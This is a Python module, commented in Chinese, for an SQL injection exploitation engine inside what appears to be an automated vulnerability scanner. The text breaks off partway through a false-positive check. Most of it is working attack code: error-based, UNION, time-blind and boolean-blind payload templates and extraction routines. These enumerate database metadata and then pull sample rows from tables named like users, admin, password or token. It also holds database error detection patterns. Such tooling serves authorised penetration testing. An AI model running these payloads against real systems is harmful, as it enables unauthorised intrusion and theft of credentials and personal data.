"""
SQLi Exploiter — SQL注入深入利用引擎

核心定位：
  不是验证"有没有SQL注入"（Phase 2 的 LLM 已经做了），
  而是对已确认/疑似的注入点进行深入利用，提取实际数据证明危害。

利用策略（按信息价值排序）：
1. 提取数据库版本（version()）— 证明注入可执行
2. 提取当前用户（current_user()）— 证明权限级别
3. 提取数据库名列表 — 证明可枚举
4. 提取当前库的表名 — 证明可读取结构
5. 提取敏感表的数据样例（如 users 表的 username/email）— 证明可读取数据

支持的注入类型：
- 报错注入（extractvalue/updatexml）→ 直接回显数据
- UNION 注入 → 直接在响应中返回数据
- 时间盲注 → 逐字符提取（慢但可靠）
- 布尔盲注 → 逐字符提取（依赖页面差异）

适用场景：Phase 2 的 LLM 已经标记了 SQL 注入（vulnerable/needs_review），
          本引擎在 Phase 2.6 中被调用，深入利用并提取数据作为危害证明。
"""
# noqa: giant

from __future__ import annotations

import re
import time
from typing import Any
from urllib.parse import urlparse, urlunparse, quote

from core.fuzz.base import BaseFuzzer, FuzzTask, FuzzEvidence, FuzzResult
from core.log import get_logger

log = get_logger("fuzz.sqli")

# ============================================================
# 报错注入 payload 模板（用于提取数据）
# {expr} 会被替换为要提取的 SQL 表达式
# ============================================================
_ERROR_EXTRACT_PAYLOADS = [
    # MySQL extractvalue
    ("mysql_extractvalue", "' AND EXTRACTVALUE(1,CONCAT(0x7e,({expr}),0x7e))-- -"),
    ("mysql_extractvalue_num", " AND EXTRACTVALUE(1,CONCAT(0x7e,({expr}),0x7e))-- -"),
    # MySQL updatexml
    ("mysql_updatexml", "' AND UPDATEXML(1,CONCAT(0x7e,({expr}),0x7e),1)-- -"),
    ("mysql_updatexml_num", " AND UPDATEXML(1,CONCAT(0x7e,({expr}),0x7e),1)-- -"),
    # MySQL floor
    ("mysql_floor", "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(({expr}),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"),
    # PostgreSQL
    ("pg_cast", "'||(SELECT CAST(({expr}) AS text))-- -"),
    # MSSQL
    ("mssql_convert", "' AND 1=CONVERT(int,({expr}))-- -"),
]

# UNION 注入列数探测
_UNION_COLUMN_RANGE = range(1, 15)  # 尝试 1-14 列

# 要提取的信息（按优先级排序）
_EXTRACTION_TARGETS = [
    ("db_version", "VERSION()"),
    ("current_user", "CURRENT_USER()"),
    ("current_db", "DATABASE()"),
]

# MySQL 提取表名的 SQL
_MYSQL_TABLES_SQL = "SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1"
# MySQL 提取列名的 SQL（{table} 会被替换）
_MYSQL_COLUMNS_SQL = "SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{table}' LIMIT 1"
# MySQL 提取数据的 SQL（{columns} 和 {table} 会被替换）
_MYSQL_DATA_SQL = "SELECT CONCAT_WS(':',{columns}) FROM {table} LIMIT 3"

# 敏感表名关键词（优先提取这些表的数据）
_SENSITIVE_TABLE_KEYWORDS = ["user", "admin", "account", "member", "password", "credential", "token"]

# 从报错响应中提取数据的正则
_ERROR_DATA_PATTERN = re.compile(r"~([^~]{1,200})~|XPATH syntax error.*?'([^']{1,200})'|Duplicate entry '([^']{1,200})'")

# 数据库报错特征（用于判断报错注入是否生效）
_DB_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_",
    r"MySQLSyntaxErrorException",
    r"PostgreSQL.*ERROR",
    r"pg_query\(\)",
    r"PSQLException",
    r"Microsoft.*SQL.*Server",
    r"OLE DB.*SQL Server",
    r"SQLite.*error",
    r"sqlite3\.OperationalError",
    r"ORA-\d{5}",
    r"XPATH syntax error",
    r"Duplicate entry",
    r"EXTRACTVALUE",
    r"UPDATEXML",
]


class SQLiFuzzer(BaseFuzzer):
    """SQL注入深入利用引擎

    前提：Phase 2 的 LLM 已经确认/疑似存在 SQL 注入。
    本引擎的目标：利用注入点提取实际数据，证明危害程度。

    利用流程：
    1. 先用报错注入尝试提取 version() — 如果成功，说明是报错注入
    2. 如果报错注入失败，尝试 UNION 注入（探测列数 → 提取数据）
    3. 如果 UNION 也失败，尝试时间盲注逐字符提取
    4. 每种方式成功后，继续提取更多信息（用户名、表名、数据）
    """

    VULN_TYPES = ["SQL注入", "注入漏洞", "SQL Injection", "盲注"]
    NAME = "sqli"
    PRIORITY = 9

    # 时间盲注配置
    SLEEP_DELAY = 5
    TIME_THRESHOLD = 0.8
    # 盲注最大提取字符数（防止太慢）
    BLIND_MAX_CHARS = 50

    def can_handle(self, vuln_type: str) -> bool:
        """精确匹配 SQL 注入类型。"""
        if not vuln_type:
            return False
        vt = vuln_type.lower().strip()
        sql_keywords = [
            "sql注入", "sql injection", "sql_injection", "sqli",
            "盲注", "注入漏洞", "nosql注入",
        ]
        if any(kw in vt for kw in sql_keywords):
            return True
        if "注入" in vt:
            exclude = ["命令注入", "代码注入", "模板注入", "头注入", "crlf注入", "ldap注入", "xml注入"]
            if not any(ex in vt for ex in exclude):
                return True
        return False

    async def fuzz(self, task: FuzzTask) -> FuzzEvidence:
        """深入利用 SQL 注入，提取数据证明危害。"""
        t0 = time.time()
        timeline: list[dict[str, Any]] = []
        requests_sent = 0
        extracted_data: dict[str, Any] = {}

        if not task.param_name:
            return FuzzEvidence(
                result=FuzzResult.INCONCLUSIVE,
                confidence=0.1,
                summary="未指定参数名，无法执行 SQL 注入利用",
                fuzzer_name=self.NAME,
                elapsed_seconds=time.time() - t0,
            )

        # ============================================================
        # Step 0: 假阳性预检查 — 发送基础探测，排除类型转换/WAF/业务错误
        # ============================================================
        # 实战教训：AOMS getrolelist.do 参数被 Integer.parseInt 转换，
        # 单引号触发500但不是SQL报错；不预检会浪费时间在假阳性目标上。
        probe_payload = "'"
        probe_url, probe_body = self._inject_param(
            task.target_url, task.body, task.param_name,
            task.original_value, probe_payload
        )
        probe_resp = await self._send_request(
            method=task.method, url=probe_url,
            headers=task.headers, body=probe_body, timeout=task.timeout,
        )
        requests_sent += 1

        if self._is_false_positive(probe_resp, task.original_value):
            fp_type = self._identify_false_positive_type(probe_resp, task.original_value)
            timeline.append({
                "step": "false_positive_precheck",
                "action": "假阳性预检命中",
                "fp_type": fp_type,
            })
            elapsed = time.time() - t0
            return FuzzEvidence(
                result=FuzzResult.NOT_VULN,
                confidence=0.9,
                summary=f"假阳性排除：{fp_type}，非SQL注入",
                fuzzer_name=self.NAME,
                requests_sent=requests_sent,
                elapsed_seconds=elapsed,
                timeline=timeline,
                stop_reason="false_positive_detected",
            )

        timeline.append({"step": "false_positive_precheck", "action": "通过，未命中假阳性"})

        # ============================================================
        # Step 1: 尝试报错注入提取数据
        # ============================================================
        timeline.append({"step": "error_based_exploit", "action": "尝试报错注入提取数据"})
        error_result = await self._exploit_error_based(task, timeline)
        requests_sent += error_result["requests"]

        if error_result["success"]:
            extracted_data.update(error_result["data"])
            # 报错注入成功，继续提取更多信息
            more = await self._extract_more_via_error(
                task, error_result["working_payload_tpl"], timeline
            )
            requests_sent += more["requests"]
            extracted_data.update(more["data"])

            elapsed = time.time() - t0
            return self._build_success_evidence(
                extracted_data, requests_sent, elapsed,
                error_result.get("poc", ""), timeline,
                method="报错注入",
            )

        # ============================================================
        # Step 2: 尝试 UNION 注入
        # ============================================================
        timeline.append({"step": "union_exploit", "action": "尝试 UNION 注入提取数据"})
        union_result = await self._exploit_union_based(task, timeline)
        requests_sent += union_result["requests"]

        if union_result["success"]:
            extracted_data.update(union_result["data"])
            elapsed = time.time() - t0
            return self._build_success_evidence(
                extracted_data, requests_sent, elapsed,
                union_result.get("poc", ""), timeline,
                method="UNION 注入",
            )

        # ============================================================
        # Step 3: 尝试时间盲注提取数据
        # ============================================================
        if requests_sent < task.max_requests - 20:
            timeline.append({"step": "time_blind_exploit", "action": "尝试时间盲注提取数据"})
            blind_result = await self._exploit_time_blind(task, timeline)
            requests_sent += blind_result["requests"]

            if blind_result["success"]:
                extracted_data.update(blind_result["data"])
                elapsed = time.time() - t0
                return self._build_success_evidence(
                    extracted_data, requests_sent, elapsed,
                    blind_result.get("poc", ""), timeline,
                    method="时间盲注",
                )

        # ============================================================
        # Step 4: 尝试布尔盲注提取数据
        # ============================================================
        if requests_sent < task.max_requests - 20:
            timeline.append({"step": "boolean_blind_exploit", "action": "尝试布尔盲注提取数据"})
            boolean_result = await self._exploit_boolean_blind(task, timeline)
            requests_sent += boolean_result["requests"]

            if boolean_result["success"]:
                extracted_data.update(boolean_result["data"])
                elapsed = time.time() - t0
                return self._build_success_evidence(
                    extracted_data, requests_sent, elapsed,
                    boolean_result.get("poc", ""), timeline,
                    method="布尔盲注",
                )

        # ============================================================
        # 利用失败
        # ============================================================
        elapsed = time.time() - t0
        if extracted_data:
            # 部分成功
            return FuzzEvidence(
                result=FuzzResult.CONFIRMED,
                confidence=0.7,
                summary=f"SQL注入利用部分成功，提取到: {list(extracted_data.keys())}",
                fuzzer_name=self.NAME,
                requests_sent=requests_sent,
                elapsed_seconds=elapsed,
                extracted_data=extracted_data,
                data_leaked=str(extracted_data)[:500],
                timeline=timeline,
            )

        return FuzzEvidence(
            result=FuzzResult.INCONCLUSIVE,
            confidence=0.3,
            summary="SQL注入利用未成功提取数据（可能有WAF或注入类型不支持）",
            fuzzer_name=self.NAME,
            requests_sent=requests_sent,
            elapsed_seconds=elapsed,
            timeline=timeline,
        )

    # ============================================================
    # 报错注入利用
    # ============================================================

    async def _exploit_error_based(self, task: FuzzTask, timeline: list) -> dict[str, Any]:
        """尝试报错注入提取 version()。"""
        result: dict[str, Any] = {"success": False, "requests": 0, "data": {}}

        for tpl_name, payload_tpl in _ERROR_EXTRACT_PAYLOADS:
            if result["requests"] >= 14:
                break

            # 先提取 version() 验证报错注入是否可用
            payload = payload_tpl.format(expr="VERSION()")
            inject_url, inject_body = self._inject_param(
                task.target_url, task.body, task.param_name,
                task.original_value, payload
            )

            resp = await self._send_request(
                method=task.method, url=inject_url,
                headers=task.headers, body=inject_body, timeout=task.timeout,
            )
            result["requests"] += 1

            if resp["error"]:
                continue

            # 从响应中提取数据
            extracted = self._extract_from_error_response(resp["body"])
            if extracted and self._looks_like_db_version(extracted):
                result["success"] = True
                result["data"]["db_version"] = extracted
                result["working_payload_tpl"] = payload_tpl
                result["poc"] = self._build_curl(task.method, inject_url, task.headers, inject_body)
                timeline.append({
                    "step": f"error_success_{tpl_name}",
                    "extracted": extracted,
                })
                return result

        return result

    async def _extract_more_via_error(
        self, task: FuzzTask, payload_tpl: str, timeline: list
    ) -> dict[str, Any]:
        """报错注入成功后，继续提取更多信息。"""
        result: dict[str, Any] = {"requests": 0, "data": {}}

        # 提取 current_user
        data = await self._error_extract_expr(task, payload_tpl, "CURRENT_USER()")
        result["requests"] += 1
        if data:
            result["data"]["current_user"] = data

        # 提取 database()
        data = await self._error_extract_expr(task, payload_tpl, "DATABASE()")
        result["requests"] += 1
        if data:
            result["data"]["current_db"] = data

        # 提取表名
        data = await self._error_extract_expr(
            task, payload_tpl,
            "(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 1)"
        )
        result["requests"] += 1
        if data:
            tables = [t.strip() for t in data.split(",") if t.strip()]
            result["data"]["tables"] = tables[:20]  # 最多记录 20 个表

            # 找敏感表，提取数据样例
            sensitive_table = self._find_sensitive_table(tables)
            if sensitive_table:
                # 提取列名
                col_data = await self._error_extract_expr(
                    task, payload_tpl,
                    f"(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='{sensitive_table}' LIMIT 1)"
                )
                result["requests"] += 1
                if col_data:
                    columns = [c.strip() for c in col_data.split(",") if c.strip()]
                    result["data"]["sensitive_table"] = sensitive_table
                    result["data"]["columns"] = columns[:15]

                    # 提取数据样例（取前 2 列拼接）
                    sample_cols = ",".join(columns[:3])
                    sample_data = await self._error_extract_expr(
                        task, payload_tpl,
                        f"(SELECT CONCAT_WS(':',{sample_cols}) FROM {sensitive_table} LIMIT 1)"
                    )
                    result["requests"] += 1
                    if sample_data:
                        result["data"]["sample_data"] = sample_data

                timeline.append({
                    "step": "extract_tables_and_data",
                    "tables_found": len(tables),
                    "sensitive_table": sensitive_table,
                    "sample_extracted": bool(result["data"].get("sample_data")),
                })

        return result

    async def _error_extract_expr(self, task: FuzzTask, payload_tpl: str, expr: str) -> str:
        """用报错注入提取一个 SQL 表达式的值。"""
        payload = payload_tpl.format(expr=expr)
        inject_url, inject_body = self._inject_param(
            task.target_url, task.body, task.param_name,
            task.original_value, payload
        )
        resp = await self._send_request(
            method=task.method, url=inject_url,
            headers=task.headers, body=inject_body, timeout=task.timeout,
        )
        if resp["error"]:
            return ""
        return self._extract_from_error_response(resp["body"])

    # ============================================================
    # UNION 注入利用
    # ============================================================

    async def _exploit_union_based(self, task: FuzzTask, timeline: list) -> dict[str, Any]:
        """尝试 UNION 注入：先探测列数，再提取数据。"""
        result: dict[str, Any] = {"success": False, "requests": 0, "data": {}}

        # Step 1: 探测列数（ORDER BY 方式）
        col_count = await self._detect_column_count(task, result, timeline)
        if col_count == 0:
            return result

        # Step 2: 找到回显位
        echo_pos, marker_payload = await self._find_echo_position(task, col_count, result, timeline)
        if echo_pos < 0:
            return result

        # Step 3: 提取数据
        # 构造 UNION SELECT，在回显位放入要提取的表达式
        for info_name, expr in _EXTRACTION_TARGETS:
            columns = ["NULL"] * col_count
            columns[echo_pos] = expr
            union_payload = f"' UNION SELECT {','.join(columns)}-- -"

            inject_url, inject_body = self._inject_param(
                task.target_url, task.body, task.param_name,
                task.original_value, union_payload
            )
            resp = await self._send_request(
                method=task.method, url=inject_url,
                headers=task.headers, body=inject_body, timeout=task.timeout,
            )
            result["requests"] += 1

            if resp["error"]:
                continue

            # 从响应中找到提取的数据
            extracted = self._find_union_data(resp["body"], task.baseline_response or "")
            if extracted:
                result["data"][info_name] = extracted
                if not result["success"]:
                    result["success"] = True
                    result["poc"] = self._build_curl(task.method, inject_url, task.headers, inject_body)

        # 提取表名
        if result["success"]:
            columns = ["NULL"] * col_count
            columns[echo_pos] = "(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=DATABASE())"
            union_payload = f"' UNION SELECT {','.join(columns)}-- -"
            inject_url, inject_body = self._inject_param(
                task.target_url, task.body, task.param_name,
                task.original_value, union_payload
            )
            resp = await self._send_request(
                method=task.method, url=inject_url,
                headers=task.headers, body=inject_body, timeout=task.timeout,
            )
            result["requests"] += 1
            if not resp["error"]:
                tables_str = self._find_union_data(resp["body"], task.baseline_response or "")
                if tables_str:
                    result["data"]["tables"] = [t.strip() for t in tables_str.split(",")][:20]

        timeline.append({
            "step": "union_result",
            "col_count": col_count,
            "echo_pos": echo_pos,
            "data_extracted": list(result["data"].keys()),
        })

        return result

    async def _detect_column_count(self, task: FuzzTask, result: dict, timeline: list) -> int:
        """用 ORDER BY 探测列数。"""
        for n in [1, 5, 10, 15, 20, 3, 7, 12]:
            payload = f"' ORDER BY {n}-- -"
            inject_url, inject_body = self._inject_param(
                task.target_url, task.body, task.param_name,
                task.original_value, payload
            )
            resp = await self._send_request(
                method=task.method, url=inject_url,
                headers=task.headers, body=inject_body, timeout=task.timeout,
            )
            result["requests"] += 1
            if resp["error"]:
                continue

            # ORDER BY N 成功（无报错）但 ORDER BY N+1 报错 → 列数为 N
            has_error = bool(self._find_db_error(resp["body"]))
            if has_error:
                # 二分法精确定位
                low, high = 1, n
                while low < high:
                    mid = (low + high) // 2
                    p = f"' ORDER BY {mid}-- -"
                    u, b = self._inject_param(task.target_url, task.body, task.param_name, task.original_value, p)
                    r = await self._send_request(method=task.method, url=u, headers=task.headers, body=b, timeout=task.timeout)
                    result["requests"] += 1
                    if self._find_db_error(r.get("body", "")):
                        high = mid - 1
                    else:
                        low = mid + 1
                col_count = max(1, high)
                timeline.append({"step": "column_count", "count": col_count})
                return col_count

        return 0

    async def _find_echo_position(self, task: FuzzTask, col_count: int, result: dict, timeline: list) -> tuple[int, str]:
        """找到 UNION SELECT 中哪个位置会回显到页面。"""
        # 用唯一标记填充每个位置
        markers = [f"vrf{i}x" for i in range(col_count)]
        columns = [f"'{m}'" for m in markers]
        union_payload = f"' UNION SELECT {','.join(columns)}-- -"

        inject_url, inject_body = self._inject_param(
            task.target_url, task.body, task.param_name,
            task.original_value, union_payload
        )
        resp = await self._send_request(
            method=task.method, url=inject_url,
            headers=task.headers, body=inject_body, timeout=task.timeout,
        )
        result["requests"] += 1

        if resp["error"]:
            return -1, ""

        # 找哪个 marker 出现在响应中
        for i, marker in enumerate(markers):
            if marker in resp["body"]:
                return i, union_payload

        return -1, ""

    # ============================================================
    # 时间盲注利用（逐字符提取）
    # ============================================================

    async def _exploit_time_blind(self, task: FuzzTask, timeline: list) -> dict[str, Any]:
        """时间盲注逐字符提取数据（使用二分搜索优化）。"""
        result: dict[str, Any] = {"success": False, "requests": 0, "data": {}}
        delay = self.SLEEP_DELAY

        # 先确认时间盲注可用
        working_tpl = await self._find_working_time_payload(task, result)
        if not working_tpl:
            return result

        # 使用二分搜索提取 version()（更快，请求更少）
        version = await self._blind_extract_string_binary(
            task, working_tpl, "VERSION()", result, max_chars=30
        )
        if version:
            result["success"] = True
            result["data"]["db_version"] = version
            result["poc"] = f"时间盲注提取 VERSION(): {version}"

            # 继续提取 current_user
            if result["requests"] < task.max_requests - 20:
                user = await self._blind_extract_string_binary(
                    task, working_tpl, "CURRENT_USER()", result, max_chars=30
                )
                if user:
                    result["data"]["current_user"] = user

            # 提取 database()
            if result["requests"] < task.max_requests - 20:
                db = await self._blind_extract_string_binary(
                    task, working_tpl, "DATABASE()", result, max_chars=30
                )
                if db:
                    result["data"]["current_db"] = db

        timeline.append({
            "step": "time_blind_result",
            "data_extracted": list(result["data"].keys()),
            "total_requests": result["requests"],
        })

        return result

    async def _exploit_boolean_blind(self, task: FuzzTask, timeline: list) -> dict[str, Any]:
        """布尔盲注数据提取（使用二分搜索优化）。"""
        result: dict[str, Any] = {"success": False, "requests": 0, "data": {}}

        # 构造注入点信息
        injection_point = {
            "url": task.target_url,
            "body": task.body,
            "param_name": task.param_name,
            "original_value": task.original_value,
        }

        # 使用二分搜索提取 version()
        version = await self._boolean_blind_extract_string(
            task, injection_point, "VERSION()", result, max_chars=30
        )
        if version:
            result["success"] = True
            result["data"]["db_version"] = version
            result["poc"] = f"布尔盲注提取 VERSION(): {version}"

            # 继续提取 current_user
            if result["requests"] < task.max_requests - 20:
                user = await self._boolean_blind_extract_string(
                    task, injection_point, "CURRENT_USER()", result, max_chars=30
                )
                if user:
                    result["data"]["current_user"] = user

            # 提取 database()
            if result["requests"] < task.max_requests - 20:
                db = await self._boolean_blind_extract_string(
                    task, injection_point, "DATABASE()", result, max_chars=30
                )
                if db:
                    result["data"]["current_db"] = db

        timeline.append({
            "step": "boolean_blind_result",
            "data_extracted": list(result["data"].keys()),
            "total_requests": result["requests"],
        })

        return result

    async def _find_working_time_payload(self, task: FuzzTask, result: dict) -> str:
        """找到一个可用的时间盲注 payload 模板。"""
        delay = self.SLEEP_DELAY
        threshold = delay * self.TIME_THRESHOLD

        # 先测基线时间
        baseline = await self._send_request(
            method=task.method, url=task.target_url,
            headers=task.headers, body=task.body, timeout=task.timeout,
        )
        result["requests"] += 1
        baseline_time = baseline.get("elapsed", 0)

        time_templates = [
            "' AND IF(1=1,SLEEP({delay}),0)-- -",
            " AND IF(1=1,SLEEP({delay}),0)-- -",
            "' AND (SELECT SLEEP({delay}))-- -",
            " AND (SELECT SLEEP({delay}))-- -",
        ]

        for tpl in time_templates:
            payload = tpl.format(delay=delay)
            inject_url, inject_body = self._inject_param(
                task.target_url, task.body, task.param_name,
                task.original_value, payload
            )
            resp = await self._send_request(
                method=task.method, url=inject_url,
                headers=task.headers, body=inject_body,
                timeout=task.timeout + delay + 5,
            )
            result["requests"] += 1

            if resp["error"]:
                continue

            if resp["elapsed"] >= baseline_time + threshold:
                # 返回用于逐字符提取的模板
                # 格式: ' AND IF(SUBSTRING(({expr}),{pos},1)='{char}',SLEEP({delay}),0)-- -
                blind_tpl = tpl.replace("1=1", "SUBSTRING(({expr}),{pos},1)='{char}'")
                return blind_tpl

        return ""

    async def _blind_extract_string(
        self, task: FuzzTask, blind_tpl: str, expr: str,
        result: dict, max_chars: int = 50
    ) -> str:
        """时间盲注逐字符提取一个字符串。"""
        delay = self.SLEEP_DELAY
        threshold = delay * self.TIME_THRESHOLD
        extracted = ""
        charset = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@._-/:; "

        # 先测基线时间
        baseline = await self._send_request(
            method=task.method, url=task.target_url,
            headers=task.headers, body=task.body, timeout=task.timeout,
        )
        result["requests"] += 1
        baseline_time = baseline.get("elapsed", 0)

        for pos in range(1, max_chars + 1):
            if result["requests"] >= task.max_requests:
                break

            found_char = False
            for char in charset:
                payload = blind_tpl.format(expr=expr, pos=pos, char=char, delay=delay)
                inject_url, inject_body = self._inject_param(
                    task.target_url, task.body, task.param_name,
                    task.original_value, payload
                )
                resp = await self._send_request(
                    method=task.method, url=inject_url,
                    headers=task.headers, body=inject_body,
                    timeout=task.timeout + delay + 5,
                )
                result["requests"] += 1

                if resp["error"]:
                    continue

                if resp["elapsed"] >= baseline_time + threshold:
                    extracted += char
                    found_char = True
                    break

            if not found_char:
                break  # 字符串结束

        return extracted

    async def _blind_extract_string_binary(
        self,
        task: FuzzTask,
        blind_tpl: str,
        expr: str,
        result: dict,
        max_chars: int = 50,
        charset: str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-{}",
    ) -> str:
        """使用二分搜索提取字符串（比线性快 ~10x）

        通过二分搜索 ASCII 值来定位每个字符，减少请求次数。
        线性搜索每个字符需要 ~70 次请求（遍历 charset），
        二分搜索每个字符仅需 ~7 次请求（log2(126-32) ≈ 7）。
        """
        delay = self.SLEEP_DELAY
        threshold = delay * self.TIME_THRESHOLD
        extracted_chars = []

        # 先测基线时间
        baseline = await self._send_request(
            method=task.method, url=task.target_url,
            headers=task.headers, body=task.body, timeout=task.timeout,
        )
        result["requests"] += 1
        baseline_time = baseline.get("elapsed", 0)

        for pos in range(1, max_chars + 1):
            if result["requests"] >= task.max_requests:
                break

            # 二分搜索 ASCII 值：32-126（可打印字符范围）
            low, high = 32, 126
            found_char = None

            while low <= high:
                if result["requests"] >= task.max_requests:
                    break

                mid = (low + high) // 2

                # Payload: IF(ASCII(SUBSTR(({expr}),{pos},1))>{mid},SLEEP({delay}),0)
                payload_greater = f"' AND IF(ASCII(SUBSTR(({expr}),{pos},1))>{mid},SLEEP({delay}),0)-- -"
                inject_url, inject_body = self._inject_param(
                    task.target_url, task.body, task.param_name,
                    task.original_value, payload_greater
                )
                t0 = time.time()
                resp = await self._send_request(
                    method=task.method, url=inject_url,
                    headers=task.headers, body=inject_body,
                    timeout=task.timeout + delay + 5,
                )
                result["requests"] += 1
                elapsed_greater = time.time() - t0

                if resp["error"]:
                    low = mid + 1
                    continue

                if elapsed_greater >= baseline_time + threshold:
                    # 字符 ASCII 值大于 mid
                    low = mid + 1
                else:
                    # 测试是否等于 mid
                    payload_equals = f"' AND IF(ASCII(SUBSTR(({expr}),{pos},1))={mid},SLEEP({delay}),0)-- -"
                    inject_url, inject_body = self._inject_param(
                        task.target_url, task.body, task.param_name,
                        task.original_value, payload_equals
                    )
                    t0 = time.time()
                    resp = await self._send_request(
                        method=task.method, url=inject_url,
                        headers=task.headers, body=inject_body,
                        timeout=task.timeout + delay + 5,
                    )
                    result["requests"] += 1
                    elapsed_equals = time.time() - t0

                    if not resp["error"] and elapsed_equals >= baseline_time + threshold:
                        found_char = chr(mid)
                        break
                    else:
                        high = mid - 1

            if found_char:
                extracted_chars.append(found_char)
                log.info(f"二分搜索提取位置 {pos}: {found_char} (ASCII {ord(found_char)})")
            else:
                # 字符串结束或搜索失败
                break

        # 验证提取结果
        if extracted_chars and not self._validate_extraction(extracted_chars):
            log.warning("二分搜索提取结果验证失败，返回空字符串")
            return ""

        return "".join(extracted_chars)

    async def _boolean_blind_extract_string(
        self,
        task: FuzzTask,
        injection_point: dict,
        query: str,
        result: dict,
        max_chars: int = 50,
    ) -> str:
        """布尔盲注数据提取

        通过观察 True/False 条件下响应的差异来逐字符提取数据。
        使用二分搜索优化，减少请求次数。
        """
        extracted_chars = []

        # 获取基线响应
        baseline_resp = await self._send_request(
            method=task.method, url=task.target_url,
            headers=task.headers, body=task.body, timeout=task.timeout,
        )
        result["requests"] += 1
        baseline_body = baseline_resp.get("body", "")

        for pos in range(1, max_chars + 1):
            if result["requests"] >= task.max_requests:
                break

            # 二分搜索 ASCII 值
            low, high = 32, 126
            found_char = None

            while low <= high:
                if result["requests"] >= task.max_requests:
                    break

                mid = (low + high) // 2

                # True payload: ASCII 值 > mid
                true_payload = f"' AND ASCII(SUBSTR(({query}),{pos},1))>{mid}-- -"
                inject_url, inject_body = self._inject_param(
                    task.target_url, task.body, task.param_name,
                    task.original_value, true_payload
                )
                true_resp = await self._send_request(
                    method=task.method, url=inject_url,
                    headers=task.headers, body=inject_body,
                    timeout=task.timeout,
                )
                result["requests"] += 1

                # False payload: ASCII 值 <= mid
                false_payload = f"' AND ASCII(SUBSTR(({query}),{pos},1))<={mid}-- -"
                inject_url, inject_body = self._inject_param(
                    task.target_url, task.body, task.param_name,
                    task.original_value, false_payload
                )
                false_resp = await self._send_request(
                    method=task.method, url=inject_url,
                    headers=task.headers, body=inject_body,
                    timeout=task.timeout,
                )
                result["requests"] += 1

                if true_resp["error"] or false_resp["error"]:
                    continue

                # 判断 True/False 条件
                true_is_different = self._is_true_response(true_resp.get("body", ""), baseline_body)
                false_is_different = self._is_true_response(false_resp.get("body", ""), baseline_body)

                if true_is_different and not false_is_different:
                    # 字符 ASCII 值 > mid
                    low = mid + 1
                elif not true_is_different and false_is_different:
                    # 字符 ASCII 值 <= mid
                    high = mid
                elif true_is_different and false_is_different:
                    # 两者都不同，说明条件为等于
                    found_char = chr(mid)
                    break
                else:
                    # 两者都相同，可能已到字符串末尾
                    high = mid - 1

            if found_char:
                extracted_chars.append(found_char)
                log.info(f"布尔盲注提取位置 {pos}: {found_char} (ASCII {ord(found_char)})")
            else:
                break

        # 验证提取结果
        if extracted_chars and not self._validate_extraction(extracted_chars):
            log.warning("布尔盲注提取结果验证失败，返回空字符串")
            return ""

        return "".join(extracted_chars)

    def _is_true_response(self, response_body: str, baseline_body: str) -> bool:
        """判断响应是否为 True 条件的响应

        通过比较响应长度和内容差异来判断。
        True 条件的响应应该与基线相似或更长（因为条件成立返回了正常数据）。
        """
        if not response_body:
            return False

        # 归一化响应体（剥离动态内容）
        norm_response = normalize(response_body)
        norm_baseline = normalize(baseline_body)

        # 计算相似度
        if not norm_response and not norm_baseline:
            return True
        if not norm_response or not norm_baseline:
            return False

        # 长度比较
        len_ratio = len(norm_response) / max(len(norm_baseline), 1)
        if len_ratio > 0.9:
            return True
        if len_ratio < 0.5:
            return False

        # Jaccard 相似度
        tokens1 = set(norm_response.split())
        tokens2 = set(norm_baseline.split())
        if tokens1 and tokens2:
            jaccard = len(tokens1 & tokens2) / len(tokens1 | tokens2)
            return jaccard >= 0.85

        return False

    # ============================================================
    # 辅助方法
    # ============================================================

    def _inject_param(
        self, url: str, body: str, param_name: str,
        original_value: str, payload: str
    ) -> tuple[str, str]:
        """将 payload 注入到参数值后面。"""
        import re as _re

        injected_value = (original_value or "") + payload

        # URL query 参数
        parsed = urlparse(url)
        if param_name in (parsed.query or ""):
            new_query = _re.sub(
                rf"({_re.escape(param_name)}=)[^&]*",
                rf"\g<1>{quote(injected_value, safe='')}",
                parsed.query,
            )
            return urlunparse(parsed._replace(query=new_query)), body

        # Body 中替换
        if body and original_value and original_value in body:
            return url, body.replace(original_value, injected_value, 1)

        # 兜底：追加到 URL
        sep = "&" if "?" in url else "?"
        return f"{url}{sep}{param_name}={quote(injected_value, safe='')}", body

    def _extract_from_error_response(self, body: str) -> str:
        """从报错注入响应中提取数据（~data~ 格式）。"""
        match = _ERROR_DATA_PATTERN.search(body)
        if match:
            # 取第一个非空的捕获组
            for g in match.groups():
                if g:
                    return g.strip()
        return ""

    def _looks_like_db_version(self, text: str) -> bool:
        """判断提取的文本是否像数据库版本号。"""
        if not text:
            return False
        # 常见版本格式
        version_patterns = [
            r"\d+\.\d+",           # 5.7, 8.0
            r"MySQL",
            r"MariaDB",
            r"PostgreSQL",
            r"Microsoft SQL Server",
            r"SQLite",
            r"Oracle",
        ]
        return any(re.search(p, text, re.IGNORECASE) for p in version_patterns)

    def _find_db_error(self, body: str) -> str:
        """在响应中查找数据库错误信息。"""
        for pattern in _DB_ERROR_PATTERNS:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                start = max(0, match.start() - 30)
                end = min(len(body), match.end() + 30)
                return body[start:end].strip()
        return ""

    def _is_type_conversion_false_positive(self, response: dict, param_value: str) -> bool:
        """
        参数强制类型转换排除法

        实战教训：AOMS getrolelist.do 参数被Integer.parseInt转换后入SQL，
        单引号/OR均触发500但不是SQL报错，是假阳性。
        """
        # 条件1：参数是纯数字
        if param_value and param_value.isdigit():
            # 条件2：响应是500错误
            status_code = response.get("status", 0)
            if status_code == 500:
                body = response.get("body", "")
                # 条件3：响应中无SQL报错特征
                sql_errors = ["SQL syntax", "MySQL", "PostgreSQL", "ORA-", "sqlite", "SQL error"]
                has_sql_error = any(err in body for err in sql_errors)
                
                if not has_sql_error:
                    # 条件4：响应包含类型转换错误
                    type_errors = [
